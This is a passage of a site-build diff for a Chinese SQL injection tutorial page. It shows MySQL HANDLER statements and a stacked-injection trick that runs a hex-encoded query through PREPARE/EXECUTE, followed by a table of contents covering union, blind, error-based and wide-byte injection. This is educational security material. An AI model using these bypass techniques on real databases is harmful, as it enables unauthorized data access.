 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler test open;</span><br><span class="line">handler test read first;</span><br><span class="line">handler test close;</span><br></pre></td></tr></table></figure></div>
-
-
-
-
-
 <ol>
 <li>动态执行预处理</li>
 </ol>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=0xxxxx; # 要执行语句的16进制</span><br><span class="line">prepare test from @a;</span><br><span class="line">execute test;</span><br></pre></td></tr></table></figure></div>
-
-
-
-
-
-
-
 
 		</div>
 
@@ -586,7 +599,7 @@
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
 		<div class="page-title">sql注入</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="nav-text">数据库基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">判断注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%88%97%E6%95%B0"><span class="nav-text">查列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="nav-text">确定字段位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%88%97%E5%90%8D"><span class="nav-text">查列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-text">获取数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9B%B2%E6%B3%A8"><span class="nav-text">无回显盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="nav-text">bool盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text">堆叠注入</span></a></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text"> SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="nav-text"> 数据库基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text"> 联合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text"> 判断注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%88%97%E6%95%B0"><span class="nav-text"> 查列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="nav-text"> 确定字段位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="nav-text"> 查表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%88%97%E5%90%8D"><span class="nav-text"> 查列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-text"> 获取数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9B%B2%E6%B3%A8"><span class="nav-text"> 无回显盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="nav-text"> bool 盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text"> 时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text"> 报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text"> 宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text"> 堆叠注入</span></a></li></ol></li></ol>
 
 	</div>
 </div>
